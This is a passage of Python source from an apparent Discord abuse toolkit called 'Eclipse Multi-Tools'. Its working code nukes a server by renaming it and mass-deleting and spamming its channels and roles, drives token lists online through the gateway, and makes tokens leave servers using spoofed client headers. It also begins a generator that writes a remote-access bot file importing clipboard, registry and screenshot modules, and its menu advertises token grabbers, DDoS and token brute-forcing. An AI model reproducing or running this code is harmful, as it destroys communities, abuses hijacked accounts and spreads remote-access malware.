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"

            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By Eclipse Multi-Tools", 'icon':image})

            channels = open('data/channels.txt')
            roles = open('data/roles.txt')

            for channel in channels:
                threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
            for role in roles:
                threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
            for i in range(int(cha)):
                threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
            for i in range(int(ra)):
                threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

        async def Menu(self):
            await self.Scrape()
            time.sleep(2)
            await self.NukeStart()
            time.sleep(2)
            await self.Menu()

        @client.event
        async def on_ready(*Args):
            await UNuker().Menu()

        def Check(self):
            client.run(token, bot=False)

    if __name__ == "__main__":
        UNuker().Check()

  def onliner():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Onliner")
    options5 = input(f'''
    {Fore.RED}
 ▒█████   ███▄    █  ██▓     ██ ███▄    █ ▓█████ ██▀███  
▒██▒  ██▒ ██ ▀█   █ ▓██▒   ▒▓██ ██ ▀█   █ ▓█   ▀▓██ ▒ ██▒
▒██░  ██▒▓██  ▀█ ██▒▒██░   ░▒██▓██  ▀█ ██▒▒███  ▓██ ░▄█ ▒
▒██   ██░▓██▒  ▐▌██▒▒██░    ░██▓██▒  ▐▌██▒▒▓█  ▄▒██▀▀█▄  
░ ████▓▒░▒██░   ▓██░░██████ ░██▒██░   ▓██░░▒████░██▓ ▒██▒
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▓   ░▓ ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░ ▒    ▒ ░ ░░   ░ ▒░ ░ ░    ░▒ ░ ▒░
░ ░ ░ ▒     ░   ░ ░   ░ ░    ▒    ░   ░ ░    ░     ░   ░ 
    ░ ░           ░     ░    ░          ░    ░     ░     

{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}make sure you put tokens in [{Fore.YELLOW}tokens.txt]

{Fore.RED}[{Fore.YELLOW}01{Fore.RED}] {Fore.YELLOW}ONLINER
{Fore.RED}[{Fore.YELLOW}02{Fore.RED}] {Fore.YELLOW}GAME ACTIVITY
{Fore.RED}[{Fore.YELLOW}03{Fore.RED}] {Fore.YELLOW}Eclipse ONLINER 

    {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}''')

    if options5 in ['01','1']:
        def onliner1():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()

                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')

                    auth = {'op': 2,
                            'd': {'token': line,
                                    'properties': {'$os': sys.platform,
                                                    '$browser': 'RTB',
                                                    '$device': f"{sys.platform} Device"},
                                    'presence': {'game': None,
                                                'status': 'Online',
                                                'since': 0,
                                                'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner1()

    elif options5 in ['02','2']:
        game = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What do you want the game status for the tokens to be?: ''')
        def onliner2():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner2()


    elif options5 in ['03','3']:
        game = 'Eclipse On Top <3'
        def onliner3():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner3()

  def leaver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Server Leaver")
    print(f'''
{Fore.RED}
 ██▓    ▓█████ ▄▄▄      ██▒   █▓ ▓█████ ██▀███  
▓██▒    ▓█   ▀▒████▄   ▓██░   █▒ ▓█   ▀▓██ ▒ ██▒
▒██░    ▒███  ▒██  ▀█▄  ▓██  █▒░ ▒███  ▓██ ░▄█ ▒
▒██░    ▒▓█  ▄░██▄▄▄▄██  ▒██ █░░ ▒▓█  ▄▒██▀▀█▄  
░██████▒░▒████▒▓█   ▓██   ▒▀█░  ▒░▒████░██▓ ▒██▒
░ ▒░▓  ░░░ ▒░ ░▒▒   ▓▒█   ░ ▐░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░ ▒  ░ ░ ░  ░ ░   ▒▒    ░ ░░  ░ ░ ░    ░▒ ░ ▒ 
  ░ ░      ░    ░   ▒        ░      ░    ░░   ░ 
    ░  ░   ░        ░        ░  ░   ░     ░     

    ''')
    serverid = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the server id you want to leave?: ''')
    url = f'https://discord.com/api/v9/users/@me/guilds/{serverid}'

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/settings",
            'method': 'PATCH',
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.delete(url, headers=header)
        if r.status_code == 200 or 204:
            print('Left Guild!')  
  def settings():
    global Setting
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Raiders")
    Setting = input(f'''
{Fore.RED}
{Fore.RED}
  ██████  ▓█████▄▄▄█████▓▄▄▄█████▓  ██▓ ███▄    █  ▄████ 
▒██    ▒  ▓█   ▀▓  ██▒ ▓▒▓  ██▒ ▓▒▒▓██▒ ██ ▀█   █  ██▒ ▀█
░ ▓██▄    ▒███  ▒ ▓██░ ▒░▒ ▓██░ ▒░▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄
  ▒   ██▒ ▒▓█  ▄░ ▓██▓ ░ ░ ▓██▓ ░ ░░██░▓██▒  ▐▌██▒░▓█  ██
▒██████▒▒▒░▒████  ▒██▒ ░   ▒██▒ ░ ░░██░▒██░   ▓██░▒▓███▀▒
▒ ▒▓▒ ▒ ░░░░ ▒░   ▒ ░░     ▒ ░░    ░▓  ░ ▒░   ▒ ▒ ░▒   ▒ 
░ ░▒  ░ ░░ ░ ░      ░        ░    ░ ▒ ░░ ░░   ░ ▒░ ░   ░ 
░  ░  ░      ░    ░        ░      ░ ▒ ░   ░   ░ ░  ░   ░ 
      ░  ░   ░                      ░           ░      ░ 


  {Fore.RED}[{Fore.YELLOW}01{Fore.RED}] {Fore.YELLOW}Change User Name
  {Fore.RED}[{Fore.YELLOW}02{Fore.RED}] {Fore.YELLOW}Help channel{Fore.RED}({Fore.YELLOW}discord{Fore.RED})
  {Fore.RED}[{Fore.YELLOW}03{Fore.RED}] {Fore.YELLOW}Meaning Of Commands
  {Fore.RED}[{Fore.YELLOW}00{Fore.RED}] Exit

    {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}''')


    if Setting in ['1','01']:
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | User Name Changer")  
        new_user_name = print(f"""
{Fore.RED}
 █    ██   ██████  ▓█████ ██▀███       ███▄    █  ▄▄▄      ███▄ ▄███▓ ▓█████
 ██  ▓██▒▒██    ▒  ▓█   ▀▓██ ▒ ██▒     ██ ▀█   █ ▒████▄   ▓██▒▀█▀ ██▒ ▓█   ▀
▓██  ▒██░░ ▓██▄    ▒███  ▓██ ░▄█ ▒    ▓██  ▀█ ██▒▒██  ▀█▄ ▓██    ▓██░ ▒███  
▓▓█  ░██░  ▒   ██▒ ▒▓█  ▄▒██▀▀█▄      ▓██▒  ▐▌██▒░██▄▄▄▄██▒██    ▒██  ▒▓█  ▄
▒▒█████▓ ▒██████▒▒▒░▒████░██▓ ▒██▒    ▒██░   ▓██░▒▓█   ▓██▒██▒   ░██▒▒░▒████
░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░   ▒ ▒ ░▒▒   ▓▒█░ ▒░   ░  ░░░░ ▒░ 
░░▒░ ░ ░ ░ ░▒  ░ ░░ ░ ░    ░▒ ░ ▒     ░ ░░   ░ ▒░░ ░   ▒▒ ░  ░      ░░ ░ ░  
 ░░░ ░ ░ ░  ░  ░      ░    ░░   ░        ░   ░ ░   ░   ▒  ░      ░       ░  
   ░           ░  ░   ░     ░                  ░       ░         ░   ░   ░  

        """)

        new_user_name = input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Enter your new username: """)
        user_name = new_user_name
        with open(user_name_file_path, "w") as file:
            file.write(user_name)
        print(Fore.RED +f'''
{Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}Username updated successfully, {Fore.RED}({Fore.YELLOW}restart the programe{Fore.RED}){Fore.YELLOW}!
''') 
        os.system('pause')
        tool()
    elif Setting in ['2','02']:
      webbrowser.open('https://discord.gg/mQVvRGfs46')
      return
    elif Setting in ['3','03']:
        cls()
        print(f"""
{Fore.RED}> {Fore.YELLOW}TOKEN NUKERS: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN JOINER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN LEAVER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN ONLINER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}WEBHOOK RAIDER Comming Soon...
{Fore.RED}> {Fore.YELLOW}SERVER NUKER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}SERVER SPAMMER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}FRIEND SPAMMER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}DDOS ATTACKER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}NITRO GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}PROXY GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}GRABBER GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}QR GRABBER GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}RAT BOT GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}ID GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}NAME GEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN BRUTE-FORCER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN CHECKER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN LOGIN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}TOKEN INFO: Comming Soon...
{Fore.RED}> {Fore.YELLOW}PFP CHANGER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}HYPEQUAD CHANGER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}BIO CHANGER: Comming Soon...
{Fore.RED}> {Fore.YELLOW}ID TO TOKEN: Comming Soon...
{Fore.RED}> {Fore.YELLOW}MASE REPORT: Comming Soon...
            """)
    else:
        print('Invalid Option')

    while __name__ == '__main__' and Setting not in ['0','00']:
      print(Fore.YELLOW)
      os.system('pause')
      settings()

  def init():
    pass  # Ajoutez le contenu de la fonction init() si nécessaire

  def idtotoken():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Id To Token")
    print(f'''
{Fore.RED}
  ██ ▓█████▄     ▄███████▓ ▒█████      ▄███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █ 
▒▓██ ▒██▀ ██▌    ▓  ██▒ ▓▒▒██▒  ██▒    ▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █ 
░▒██ ░██   █▌    ▒ ▓██░ ▒░▒██░  ██▒    ▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒
 ░██▒░▓█▄   ▌    ░ ▓██▓ ░ ▒██   ██░    ░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐███▒
 ░██░░▒████▓       ▒██▒ ░ ░ ████▓▒░      ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░
 ░▓ ░ ▒▒▓  ▒       ▒ ░░   ░ ▒░▒░▒░       ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒ 
  ▒   ░ ▒  ▒         ░      ░ ▒ ▒░         ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░
  ▒   ░ ░  ░       ░ ░    ░ ░ ░ ▒        ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░ 
  ░     ░                     ░ ░                   ░ ░   ░  ░      ░           ░ 
    ''')

    init()

    userid = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the User's ID?: ''')
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")

    print(f'\n  FIRST PART : {encodedStr}')

  global discordrat
  def discordrat():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Discord Rat Bot") 
    print(f"""
{Fore.RED}
 ██▀███   ▄▄▄     ▄▄▄█████▓      ▄▄▄▄    ▒█████  ▄▄▄█████▓
▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░     ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░      ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
░██▓ ▒██▒ ▓█   ▓██  ▒██▒ ░     ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
░ ▒▓ ░▒▓░ ▒▒   ▓▒█  ▒ ░░       ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
  ░▒ ░ ▒░  ░   ▒▒     ░        ░▒░▒   ░   ░ ▒ ▒░     ░    
   ░   ░   ░   ▒    ░ ░          ░    ░ ░ ░ ░ ▒    ░ ░    
   ░           ░               ░ ░          ░ ░           

        """)
    def spinner():
        l= ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\rCreating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\rWriting File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    global filename
    fileName = str(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}File name: """))
    global tokenbot
    tokenbot = str(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Bot Token: """))
    guildid = str(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Guild ID: """))
    print('\n')
    spinner()
    if not os.path.exists("output"):
        os.makedirs("output")
        
    try:
        with open(f" <*> output/{fileName}.py", "w", encoding="utf-8") as file:
            file.write("""import discord 
import json 
import subprocess 
import asyncio 
import ctypes 
import os 
import logging 
import threading 
import requests 
import time 
import win32clipboard
import win32process
import win32con
import win32gui
import winreg
import re
import sys
import shutil
import pyautogui

from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
